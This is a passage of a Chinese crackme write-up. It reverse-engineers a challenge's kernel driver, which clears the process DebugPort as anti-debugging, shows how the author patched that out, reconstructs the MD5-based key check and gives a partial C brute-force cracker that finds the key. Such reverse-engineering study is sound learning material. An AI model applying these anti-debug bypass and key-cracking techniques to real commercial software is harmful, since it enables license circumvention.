<h1 id="00-先看驱动"><a href="#00-先看驱动" class="headerlink" title="00. 先看驱动"></a>00. 先看驱动</h1><p>驱动不大，才20多个函数。</p>
<p>从入口开始分析。</p>
<h2 id="1-创建设备"><a href="#1-创建设备" class="headerlink" title="1. 创建设备"></a>1. 创建设备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000107D5 68 58 13 01 00                                                  push    offset aDeviceVmxdrv ; &quot;\\device\\vmxdrv&quot;</span><br><span class="line">.text:000107DA 8D 45 F4                                                        lea     eax, [ebp+DestinationString]</span><br><span class="line">.text:000107DD 33 FF                                                           xor     edi, edi</span><br><span class="line">.text:000107DF 50                                                              push    eax             ; DestinationString</span><br><span class="line">.text:000107E0 89 7D FC                                                        mov     [ebp+DeviceObject], edi</span><br><span class="line">.text:000107E3 FF D6                                                           call    esi ; RtlInitUnicodeString</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>用来与应用层通信</p>
<h2 id="2-IRP-MJ-FUNCTION"><a href="#2-IRP-MJ-FUNCTION" class="headerlink" title="2. IRP_MJ_FUNCTION"></a>2. IRP_MJ_FUNCTION</h2><p>主要有三个，read/write/ioctl。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00010870 C7 46 44 A8 05 01 00                                            mov     dword ptr [esi+44h], offset f_DrvRead_105A8</span><br><span class="line">.text:00010877 C7 46 48 1C 06 01 00                                            mov     dword ptr [esi+48h], offset f_DrvWrite_1061C</span><br><span class="line">.text:0001087E C7 46 70 1A 07 01 00                                            mov     dword ptr [esi+70h], offset f_DrvControl_1071A</span><br></pre></td></tr></table></figure>
<p>先看f_DrvWrite_1061C，通过irp获取到上层传入的数据，然后通过104b6获取某个输出存入全局变量g_READCC（根据read的分析，可以知道长度为4的4字节数组）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00010669 57                                                              push    edi             ; size_t</span><br><span class="line">.text:0001066A FF 75 0C                                                        push    [ebp+Irp]       ; void *</span><br><span class="line">.text:0001066D 53                                                              push    ebx             ; void *</span><br><span class="line">.text:0001066E E8 11 0C 00 00                                                  call    memcpy</span><br><span class="line">.text:00010673 83 C4 18                                                        add     esp, 18h</span><br><span class="line">.text:00010676 83 3D D8 14 01 00 00                                            cmp     dword ptr is_clean_port, 0</span><br><span class="line">.text:0001067D 74 15                                                           jz      short loc_10694</span><br><span class="line">.text:0001067F 68 C8 14 01 00                                                  push    offset g_READCC ; int</span><br><span class="line">.text:00010684 53                                                              push    ebx             ; void *</span><br><span class="line">.text:00010685 E8 2C FE FF FF                                                  call    f_GetMd5_104B6</span><br><span class="line">.text:0001068A C7 05 DC 14 01 00 01 00 00 00                                   mov     is_write, 1</span><br></pre></td></tr></table></figure></p>
<p>进入104b6内部，key是个16字节数组，初始化0。然后将上面传下的数据拷贝到key中，长度需要小于16。然后将key进行一下变换。<br>key[0] ++(反调试标志为1，后面再说)，其他key[i] += i<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:000104F5 56                                                              push    esi             ; size_t //长度</span><br><span class="line">.text:000104F6 51                                                              push    ecx             ; void * //上层输入</span><br><span class="line">.text:000104F7 8D 45 EC                                                        lea     eax, [ebp+key]</span><br><span class="line">.text:000104FA 50                                                              push    eax             ; void *</span><br><span class="line">.text:000104FB E8 84 0D 00 00                                                  call    memcpy</span><br><span class="line">...</span><br><span class="line">text:00010505 39 05 D8 14 01 00                                               cmp     dword ptr is_clean_port, eax //判断标志是否为0，不为0，key[0] ++</span><br><span class="line">.text:0001050B 74 03                                                           jz      short loc_10510</span><br><span class="line">.text:0001050D FE 45 EC                                                        inc     [ebp+key]</span><br><span class="line">.text:00010510</span><br><span class="line">.text:00010510                                                 loc_10510:                              ; CODE XREF: f_GetMd5_104B6+55</span><br><span class="line">.text:00010510 3B F0                                                           cmp     esi, eax</span><br><span class="line">.text:00010512 7E 09                                                           jle     short loc_1051D</span><br><span class="line">.text:00010514</span><br><span class="line">.text:00010514                                                 loc_10514:                              ; CODE XREF: f_GetMd5_104B6+65</span><br><span class="line">.text:00010514 00 44 05 EC                                                     add     [ebp+eax+key], al //key[i] += i</span><br><span class="line">.text:00010518 40                                                              inc     eax</span><br><span class="line">.text:00010519 3B C6                                                           cmp     eax, esi</span><br><span class="line">.text:0001051B 7C F7                                                           jl      short loc_10514</span><br></pre></td></tr></table></figure></p>
<p>接着通过下面三个函数对key进行计算，输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f_Md5_Init_108B2((MD5OBJ *)&amp;v5);</span><br><span class="line">f_Md5_j_11124((MD5OBJ *)&amp;v5, key, strlen(key));</span><br><span class="line">f_Md5_hexdigest((int)&amp;v5, md5);</span><br></pre></td></tr></table></figure></p>
<p>进入108b2一看就猜测是md5计算，f_Md5_hexdigest将计算结果(32字节字符)保存到md<br>5字段中输出，设置计算标志。也就是大致确认write是计算md5，然后保存到g_READCC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MD5OBJ *__stdcall f_Md5_Init_108B2(MD5OBJ *a1)</span><br><span class="line">&#123;</span><br><span class="line">  MD5OBJ *result; // eax@1</span><br><span class="line">_DrvControl</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;len8 = 0;</span><br><span class="line">  a1-&gt;unk_4 = 0;</span><br><span class="line">  a1-&gt;s1 = 0x67452301;</span><br><span class="line">  a1-&gt;s2 = 0xEFCDAB89;</span><br><span class="line">  a1-&gt;s3 = 0x98BADCFE;</span><br><span class="line">  a1-&gt;s4 = 0x10325476;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着看f_DrvRead_105A8，看刚才的计算标志是否为0，为0就初始化g_READCC一段值（不知道作者意图，迷惑cracker？），如果计算标志是1，就直接返回计算的结果，然后该值返回到用户空间。也就是如果通过write计算了md5，这里就是获取md5计算结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000105AD </span><br><span class="line"> if ( !is_write )</span><br><span class="line">  &#123;</span><br><span class="line">    i = 3;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      g_READCC[i] = 3 * i - &apos;d&apos;;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( i &lt; 16 );</span><br><span class="line">    g_READCC[0] = 0xCBu;</span><br><span class="line">    g_READCC[1] = 0xAAu;</span><br><span class="line">    g_READCC[2] = 0xDEu;</span><br><span class="line">    g_READCC[3] = 0xB0u;</span><br><span class="line">  &#125;</span><br><span class="line">  //返回数据</span><br><span class="line">   *(_DWORD *)&amp;MasterIrp-&gt;Type = *(_DWORD *)g_READCC;</span><br><span class="line">  v4 = (int)&amp;MasterIrp-&gt;MdlAddress;</span><br><span class="line">  *(_DWORD *)v4 = *(_DWORD *)&amp;g_READCC[4];</span><br><span class="line">  v4 += 4;</span><br><span class="line">  *(_DWORD *)v4 = *(_DWORD *)&amp;g_READCC[8];</span><br><span class="line">  *(_DWORD *)(v4 + 4) = *(_DWORD *)&amp;g_READCC[12];</span><br></pre></td></tr></table></figure></p>
<p>最后看f_DrvControl_1071A，支持多个命令号，但只有222004h有用。设置反调试标志为1，然后进入10486看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00010734 2D 04 20 22 00                                                  sub     eax, 222004h</span><br><span class="line">.text:00010739 8B 4E 0C                                                        mov     ecx, [esi+0Ch]</span><br><span class="line">.text:0001073C 74 2C                                                           jz      short loc_1076A</span><br><span class="line">...</span><br><span class="line">.text:0001076A                                                 loc_1076A:                              ; CODE XREF: f_DrvControl_1071A+22</span><br><span class="line">.text:0001076A C7 05 D8 14 01 00 01 00 00 00                                   mov     dword ptr is_clean_port, 1</span><br><span class="line">.text:00010774 FF 15 80 13 01 00                                               call    ds:IoGetCurrentProcess</span><br><span class="line">.text:0001077A A3 E0 14 01 00                                                  mov     eproc, eax</span><br><span class="line">.text:0001077F E8 02 FD FF FF                                                  call    f_ClearDebugPort_10486</span><br></pre></td></tr></table></figure></p>
<p>枚举进程找到当前进程的eprocess(其实没必要枚举把)，置eprocess-&gt;DebugPort = NULL，让应用层调试器失效，达到反跳试效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result = IoGetCurrentProcess();</span><br><span class="line">  v1 = result;</span><br><span class="line">  while ( result != (PEPROCESS)eproc )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (PEPROCESS)(*((_DWORD *)result + 0x22) - 0x88);// eproc-&gt;ActiveProcessLinks.Flink</span><br><span class="line">    if ( result == v1 )</span><br><span class="line">      return result;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)result + 0x2F) = 0;               // eproc-&gt;DebugPort = 0</span><br></pre></td></tr></table></figure></p>
<p>这里猜想一下，如果破解者通过应用层patch，不发送222004h命令来解除反跳试的话，那么这里的反跳试标志就是0，然后在write中计算md5时，对key[0]就不会做++操作，那么上层就会获取到一个错误的值，从而影响破解。</p>
<h2 id="3-k掉驱动反调试"><a href="#3-k掉驱动反调试" class="headerlink" title="3. k掉驱动反调试"></a>3. k掉驱动反调试</h2><p>首先想到的是将驱动文件patch，也就是DebugPort置零的指令nop掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:000104A9 83 A0 BC 00 00 00 00                                            and     dword ptr [eax+0BCh], 0</span><br></pre></td></tr></table></figure></p>
<p>通过reshacker将驱动资源导出来，然后hex编辑工具修改104A9的内容(文件内存对齐一样)为7个NOP，然后再将patch驱动文件导入到exe中。</p>
<p>会提示驱动加载失败，可能有校验，不再细跟。</p>
<p>没办法，为了让od能够调试，我写了个简单驱动，在本驱动加载时，将104A进行patch，通过反跳试。</p>
<h1 id="01-再看CrackMe"><a href="#01-再看CrackMe" class="headerlink" title="01. 再看CrackMe"></a>01. 再看CrackMe</h1><p>既然知道有驱动了，先找找释放和加载驱动的代码，通过 FindResourceA和CreateService即可定位（不再详述），注意到的是，驱动加载成功会设置一个标志，用于后面验证的判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5 = f_CreaetSrv_401AA0(ServiceName, &amp;Buffer);// vmxdrv</span><br><span class="line"> v1-&gt;is_drv_run = v5;</span><br></pre></td></tr></table></figure>
<p>然后再找和驱动通信的代码，通过DeviceIoControl找到调用222004命令好的代码。通过创建一个线程，循环调用该接口来清零DebugPort</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line"> &#123;</span><br><span class="line">   v0 = CreateFileA(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);</span><br><span class="line">   if ( v0 == (HANDLE)-1 )</span><br><span class="line">     break;</span><br><span class="line">   DeviceIoControl(v0, 0x222004u, 0, 0, &amp;OutBuffer, 0x100u, &amp;BytesReturned, 0);</span><br><span class="line">   CloseHandle(v0);</span><br><span class="line">   Sleep(0xBB8u);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>按理说这里可以patch掉来去掉反跳试，但就会出现我前面分析提到的问题。</p>
<p>通过WriteFile找到调用read/write的位置，也就是计算md5和获取md5的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00401D50 ; HANDLE __thiscall f_CalcKeyMd5_401D50(void *this, char *key, size_t len)</span><br><span class="line">...</span><br><span class="line">.text:00401E4E                 push    ebx             ; lpOverlapped</span><br><span class="line">.text:00401E4F                 push    eax             ; lpNumberOfBytesWritten</span><br><span class="line">.text:00401E50                 lea     ecx, [esp+344h+Buffer] //用户输入的key相关数据</span><br><span class="line">.text:00401E54                 push    esi             ; nNumberOfBytesToWrite</span><br><span class="line">.text:00401E55                 push    ecx             ; lpBuffer</span><br><span class="line">.text:00401E56                 push    edi             ; hFile</span><br><span class="line">.text:00401E57                 call    ds:WriteFile //计算md5</span><br><span class="line">.text:00401E5D                 test    eax, eax</span><br><span class="line">.text:00401E5F                 jz      short loc_401ED4</span><br><span class="line">.text:00401E61                 lea     edx, [esp+33Ch+NumberOfBytesRead]</span><br><span class="line">.text:00401E65                 push    ebx             ; lpOverlapped</span><br><span class="line">.text:00401E66                 push    edx             ; lpNumberOfBytesRead</span><br><span class="line">.text:00401E67                 lea     eax, [esp+344h+keymd5]</span><br><span class="line">.text:00401E6E                 push    10h             ; nNumberOfBytesToRead</span><br><span class="line">.text:00401E70                 push    eax             ; lpBuffer</span><br><span class="line">.text:00401E71                 push    edi             ; hFile</span><br><span class="line">.text:00401E72                 call    ds:ReadFile //读取md5</span><br></pre></td></tr></table></figure>
<p>f_CalcKeyMd5_401D50回溯一层就是输入key回车的响应函数。<br>这里先通过UpdateData(1)获取输入数据，然后拷贝到局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_UpdateData_41A4F7(1);</span><br><span class="line">f_CString_copy_417D43((CString *)&amp;key, (LPCSTR *)&amp;v1-&gt;key);//用户输入的</span><br></pre></td></tr></table></figure></p>
<p>然后输入进行小写和反转变换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_CString_lwr_4182FA((CString *)&amp;key); //小写</span><br><span class="line">f_Cstring_rev_41830C((CString *)&amp;key);        // 反转</span><br></pre></td></tr></table></figure></p>
<p>判断输入长度是否为6，不是退出，清除输入，并通过IsDebuggerPresent检查是否在调试（OD直接过），是调试也退出，清理出输入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( *(_DWORD *)(key - 8) != 6 || IsDebuggerPresent() )</span><br><span class="line">&#123;</span><br><span class="line">  CString::operator=((CString *)&amp;v1-&gt;unk_6c, byte_431398);</span><br><span class="line">  CString::operator=((CString *)&amp;v1-&gt;key, byte_431398);</span><br><span class="line">  f_UpdateData_41A4F7(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>满足长度要求，再看驱动是否加载，再调用f_CalcKeyMd5_401D50计算md5. 也就是调用驱动获取md5，记为KeyMd51.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//.text:004017DE</span><br><span class="line"> if ( v1-&gt;is_drv_run )</span><br><span class="line">    &#123;</span><br><span class="line">      keymd5str = *(_DWORD *)(key - 8);</span><br><span class="line">      v3 = sub_418263(&amp;key, 0);</span><br><span class="line">      f_CalcKeyMd5_401D50(v1, (char *)v3, keymd5str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>接着下面两个函数，先调用f_GetStrMd5_401920（应用层的Md5，通过调试可以很快确认，内部也有md5特征）计算KeyMd51的Md5，记为KeyMd52，然后调用sub_415A78截取KeyMd52从第3为开始的10字符，记为KeyMd53。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f_GetStrMd5_401920((char)v4, (CString *)keymd5str);// 00943950  37 63 37 36 36 65 32 61 31 63 61 30 35 37 63 37  7c766e2a1ca057c7</span><br><span class="line">                                            // 00943960  62 30 65 39 31 66 39 33 35 65 64 61 61 64 37 33  b0e91f935edaad73</span><br><span class="line">                                            // </span><br><span class="line">                                            // </span><br><span class="line">                                            // </span><br><span class="line">sub_415A78((LPCSTR *)&amp;keymd5str_obj, (int)&amp;v9, 2, 0xAu);// 截取2开始长度0xA的值</span><br><span class="line">                                            // 00943900  37 36 36 65 32 61 31 63 61 30 00 38 39 30 33 38  766e2a1ca0.89038</span><br><span class="line">                                            // 00943910  33 39 32 36 39 32 65 38 32 64 36 33 62 31 37 64  392692e82d63b17d</span><br><span class="line">                                            //</span><br></pre></td></tr></table></figure>
<p>最后KeyMd53与888aeda4ab比较，成功提示Success^^！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ( _mbsicmp(keymd5str_obj, a888aeda4ab) ) // 888aeda4ab</span><br><span class="line">    &#123;</span><br><span class="line">      CString::operator=((CString *)&amp;v1-&gt;unk_6c, byte_431398);</span><br><span class="line">      CString::operator=((CString *)&amp;v1-&gt;key, byte_431398);</span><br><span class="line">      f_UpdateData_41A4F7(0);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      f_ShowSuccess_402030(v1);//成功提示</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>总结算法：</p>
<ol>
<li>KEY1 = rev(lwr(key))，key长度6，将输入转小写，逆序</li>
<li>反调试成功时KEY1[0]+=1, 其他KEY1[i]+=i;</li>
<li>KEY2 = DrvMd5(KEY1)，驱动MD5计算</li>
<li>KEY3 = Md5(KEY2), 应用层Md5计算</li>
<li>KEY4 = KEY3[2:12]，取第3位开始的10个字符</li>
<li>KEY4 == ‘888aeda4ab’</li>
</ol>
<h1 id="11-求解"><a href="#11-求解" class="headerlink" title="11. 求解"></a>11. 求解</h1><p>由于MD5hash无法逆运算，只能爆破了，刚开始忘了题目key只能是数字和字母，结果我跑了全字符，跑了1天多….没出来，卡hi是怀疑自己</p>
<p>后来改成了数字字母，终于得到答案 su1987</p>
<p>爆破代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">char Seed[/*68*/36] = &#123;</span><br><span class="line">	&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,</span><br><span class="line">	&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">#define SEED_SIZE 36// 68</span><br><span class="line"></span><br><span class="line">typedef struct _THREAD_PARAM</span><br><span class="line">&#123;</span><br><span class="line">	int i1;</span><br><span class="line">	int i2;</span><br><span class="line">	int i3;</span><br><span class="line">	int i2_1;</span><br><span class="line">	int i2_2;</span><br><span class="line">&#125;TPP, *PTPP;</span><br><span class="line"></span><br><span class="line">int g_ThreadCnt = 0;</span><br><span class="line">int g_start = 0;</span><br><span class="line">long g_count = 0;</span><br><span class="line"></span><br><span class="line">void write_file(char* sz)</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hFile = CreateFileA(&quot;1.log&quot;, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line">	if(hFile)</span><br><span class="line">	&#123;</span><br><span class="line">		SetFilePointer(hFile, 0, 0, FILE_END);</span><br><span class="line">		DWORD dw = 0;</span><br><span class="line">		WriteFile(hFile, sz, strlen(sz), &amp;dw, NULL);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		hFile = NULL;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool crack1(PTPP p)</span><br><span class="line">&#123;</span><br><span class="line">	int i1 = p-&gt;i1;</span><br><span class="line">	int i2 = p-&gt;i2;</span><br><span class="line"></span><br><span class="line">	char sss[20] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">	for(int i3=0; i3&lt;SEED_SIZE; i3++)</span><br><span class="line">	&#123;</span><br><span class="line">		for(int i4=0; i4&lt;SEED_SIZE; i4++)</span><br><span class="line">		&#123;</span><br><span class="line">			for(int i5=0; i5&lt;SEED_SIZE; i5++)</span><br><span class="line">			&#123;</span><br><span class="line">				for(int i6=0; i6&lt;SEED_SIZE; i6++)</span><br><span class="line">				&#123;</span><br><span class="line">					char sza[7] = &#123;Seed[i1], Seed[i2], Seed[i3], Seed[i4], Seed[i5], Seed[i5]&#125;;</span><br><span class="line"></span><br><span class="line">					g_count ++;</span><br><span class="line"></span><br><span class="line">					char sz[7] = &#123;0&#125;;</span><br><span class="line">					//反转</span><br><span class="line">					sz[0] = Seed[i6]+1;</span><br><span class="line">					sz[1] = Seed[i5]+1;</span><br><span class="line">					sz[2] = Seed[i4]+2;</span><br><span class="line">					sz[3] = Seed[i3]+3;</span><br><span class="line">					sz[4] = Seed[i2]+4;</span><br><span class="line">					sz[5] = Seed[i1]+5;</span><br><span class="line"></span><br><span class="line">					FileMD5 fm;</span><br><span class="line">					char* p = (char*)fm.md5(sz, 6);</span><br><span class="line">					p = (char*)fm.md5(p, 32);</span><br><span class="line">					strncpy(sss, p+2, 10);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					if(!stricmp(sss, &quot;888aeda4ab&quot;))</span><br><span class="line">					&#123;</span><br><span class="line">						char info[1024] = &#123;0&#125;;</span><br><span class="line">						sprintf(info, &quot;%c%c%c%c%c%c, =&gt; %s，%s\n&quot;, </span><br><span class="line">							Seed[i1], Seed[i2], Seed[i3], Seed[i4], Seed[i5], Seed[i6], </span><br><span class="line">							sz,</span><br><span class="line">							sss</span><br><span class="line">							);</span><br><span class="line">						write_file(info);</span><br><span class="line"></span><br><span class="line">					</span><br><span class="line"></span><br><span class="line">						int spell = GetTickCount() - g_start;</span><br><span class="line">						printf(&quot;spell time : %d s&quot;, spell/1000);</span><br><span class="line"></span><br><span class="line">						system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">						return true;</span><br><span class="line">					&#125;							</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			//system(&quot;cls&quot;);</span><br><span class="line">			printf(&quot;count: %ld\n&quot;, g_count);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return false;</span><br><span class="line">&#125;</span><br><span class="line">void crack3(PTPP p)</span><br><span class="line">&#123;</span><br><span class="line">	int i1 